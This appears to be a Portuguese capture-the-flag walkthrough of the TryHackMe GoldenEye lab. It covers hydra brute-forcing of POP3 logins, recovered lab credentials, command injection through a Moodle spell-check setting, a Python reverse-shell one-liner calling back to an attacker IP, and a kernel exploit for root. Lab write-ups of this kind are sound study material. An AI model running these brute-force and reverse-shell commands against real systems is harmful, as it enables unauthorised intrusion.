@@ -1,0 +1,81 @@
+a senha esta em hexdecimal, é só deixar os numeros separados que temos nossa senha
+
+agora usamos o hydra para pegarmos a senha do boris na porta 55007
+
+hydra -l boris -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.148.19 -s 55007 pop3
+
+depois usamos o telnet para entrar com as credencias do boris
+
+telnet "ip" 55007
+
+usamos list para vermos os conteudos e retr 1, 2 e 3 para lermos seus conteudos 
+
+Agora temos +3 usuarios: natalya, alec e xenia 
+
+agora continuamos dando bruteforce nos usuarios 
+
+hydra -l natalya -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.148.19 -s 55007 pop3
+
+natalya:bird
+
+apos logarmos com as credencias da natalya temos 2 email, o segundo nos da um login e senha 
+
+username: xenia
+password: RCP90rulez!
+
+agora temos que adicionar um novo dominio em nosso /etc/hosts: severnaya-station.com
+
+vamos para http://severnaya-station.com/gnocertdir/ e entramos com as credencias da xenia
+
+agora vamos para my profile-messages e temos outro nome "doak"
+
+agora novamente damos bruteforce no doak para pegar sua senha
+
+e temos ela: goat
+
+usamos as credenciais dele logar pelo telnet
+
+e temos outro login e senha
+
+username: dr_doak
+password: 4England!
+
+usamos essas credenciais para entrar no site novamente
+
+e vamos em my profile e private files e temos um arquivo txt
+
+ao ler o arquivo eles nos da um novo diretorio
+                                                                                                                                                                                                                                           
+baixamos a imagem e usamos exiftool nela                                                                                                                                                                                                   
+                                                                                                                                                                                                                                           
+temos uma hash                                                                                                                                                                                                                             
+                                                                                                                                                                                                                                           
+o conteudo dela é: xWinter1995x!                                                                                                                                                                                                           
+
+agora entramos no site como admin
+
+agora procuramos pela palavra spell
+
+e editamos o primeiro campo para psspellshell e o ultimo com a nossa rev shell em python
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.200.252",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+agora vamos em my profile > blogs > add a new entry 
+
+damos um nome qualquer e uma descrição qualquer e clicamos do lado de html
+
+dentro da maquina vamos para a pasta /tmp
+
+agora pegamos o exploit no site do tryhackme e salvamos na nossa maquina
+
+agora temos que passar para maquina goldeneye
+
+mas antes editamos uma linha do codigo 
+
+onde tem "gcc" mudamos para "cc"
+
+e agora fazemos o upload para a goldeneye
+
+damos esse comando cc exploit.c -o exploit
+
+e somos root
